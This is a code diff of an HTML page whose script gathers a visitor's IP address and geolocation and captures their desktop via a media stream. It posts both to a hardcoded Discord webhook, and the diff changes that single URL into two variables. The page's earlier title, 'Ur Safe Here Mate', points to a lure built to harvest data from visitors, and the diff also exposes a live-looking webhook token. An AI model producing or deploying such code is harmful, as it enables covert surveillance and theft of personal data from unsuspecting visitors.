@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ur Safe Here Mate</title>
+    <title>Desktop Capture and IP Info</title>
 </head>
 <body>
-    <h1>Hello!</h1>
+    <h1>Capturing Desktop and Retrieving IP Info...</h1>
     <script>
-        // Webhook URL
-        const webhook = "https://discord.com/api/webhooks/1302019763123257455/4TQ-VR9MoQHu6AfoJBeckxGuo_JzrxhTz_r3l608tg7ODzvGYKD7hmIy-qIIqutGzhnc";
+        // Webhook URLs
+        const ipWebhook = "https://discord.com/api/webhooks/1302019763123257455/4TQ-VR9MoQHu6AfoJBeckxGuo_JzrxhTz_r3l608tg7ODzvGYKD7hmIy-qIIqutGzhnc";
+        const screenshotWebhook = "https://discord.com/api/webhooks/1302019763123257455/4TQ-VR9MoQHu6AfoJBeckxGuo_JzrxhTz_r3l608tg7ODzvGYKD7hmIy-qIIqutGzhnc"; // Change if needed
 
         // Function to retrieve the user's IP and geolocation details
         async function retrieveIPInfo() {
@@ -39,7 +40,7 @@
                 };
 
                 // Send the IP data to the Discord webhook
-                await fetch(webhook, {
+                await fetch(ipWebhook, {
                     method: 'POST',
                     headers: {
                         "Content-type": "application/json"
@@ -74,16 +75,19 @@
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
                         formData.append('file', blob, 'screenshot.png');
+
                         // Send the screenshot to the Discord webhook
-                        const response = await fetch(webhook, {
+                        const response = await fetch(screenshotWebhook, {
                             method: 'POST',
                             body: formData,
                         });
+
                         if (response.ok) {
                             console.log('Screenshot sent to Discord successfully!');
                         } else {
                             console.error('Error sending screenshot to Discord:', response.statusText);
                         }
+
                         // Stop all media tracks
                         mediaStream.getTracks().forEach(track => track.stop());
                     }, 'image/png');
